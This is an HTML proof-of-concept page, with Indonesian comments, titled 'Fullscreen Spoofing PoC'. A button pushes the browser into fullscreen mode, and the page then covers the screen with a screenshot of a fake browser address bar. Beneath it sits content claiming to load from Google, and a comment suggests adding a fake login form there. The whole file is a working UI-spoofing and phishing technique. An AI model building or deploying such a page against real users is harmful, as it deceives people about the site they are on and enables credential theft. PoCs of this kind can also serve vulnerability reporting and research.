<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fullscreen Spoofing PoC</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #fff;
            overflow: hidden; /* Mencegah scroll */
        }

        /* Tampilan Awal */
        #trigger-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        }
        #trigger-btn {
            padding: 15px 30px;
            font-size: 18px;
            cursor: pointer;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
        }

        /* Tampilan Palsu (Setelah Fullscreen) */
        #fake-browser-ui {
            display: none; /* Sembunyikan awalnya */
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 9999;
            background-color: #fff;
        }

        /* Gambar Address Bar Palsu di bagian atas */
        #fake-address-bar-img {
            width: 100%;
            display: block;
            /* Sesuaikan tinggi jika perlu, tapi biarkan auto agar proporsional */
            height: auto; 
        }

        /* Konten di bawah address bar palsu */
        #fake-content {
            padding: 50px;
            text-align: center;
            font-size: 20px;
            color: #333;
        }
    </style>
</head>
<body>
    <!-- Tampilan Awal -->
    <div id="trigger-container">
        <button id="trigger-btn">Press the button</button>
    </div>

    <!-- Tampilan Palsu -->
    <div id="fake-browser-ui">
        <!-- Gambar screenshot browser Anda dimasukkan ke sini -->
        <img id="fake-address-bar-img" src="fake-browser.png" alt="Fake Browser UI">
        
        <!-- Konten di bawahnya (misalnya halaman kosong atau form login palsu) -->
        <div id="fake-content">
            <p>Halaman ini seolah-olah dimuat dari Google.</p>
        </div>
    </div>

    <script>
        const triggerBtn = document.getElementById('trigger-btn');
        const fakeBrowserUI = document.getElementById('fake-browser-ui');

        triggerBtn.addEventListener('click', () => {
            // 1. Meminta browser masuk ke mode Fullscreen
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().then(() => {
                    // 2. Jika berhasil, tampilkan UI Palsu (termasuk gambar)
                    fakeBrowserUI.style.display = 'block';
                }).catch((err) => {
                    console.error("Gagal masuk fullscreen:", err);
                    alert("Browser Anda memblokir fullscreen atau meminta izin.");
                });
            }
        });
    </script>
</body>
</html>
